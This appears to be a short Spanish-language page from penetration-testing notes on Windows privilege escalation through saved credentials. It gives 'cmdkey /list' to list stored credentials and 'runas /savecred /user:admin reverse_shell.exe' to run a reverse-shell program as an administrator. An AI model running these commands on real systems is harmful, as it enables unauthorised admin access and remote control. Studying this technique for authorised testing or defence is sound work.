# Saved Credentials

## **Credenciales guardadas**

Windows nos permite utilizar las credenciales de otros usuarios. Esta función también da la opción de guardar estas credenciales en el sistema. El siguiente comando enumerará las credenciales guardadas.

```powershell
cmdkey /list    #enumerará las credenciales guardadas
```

Si ve alguna credencial que valga la pena probar, puede usarla con el comando  `runas` y la opción `/savecred` , como se ve a continuación.

```powershell
runas /savecred /user:admin reverse_shell.exe
```
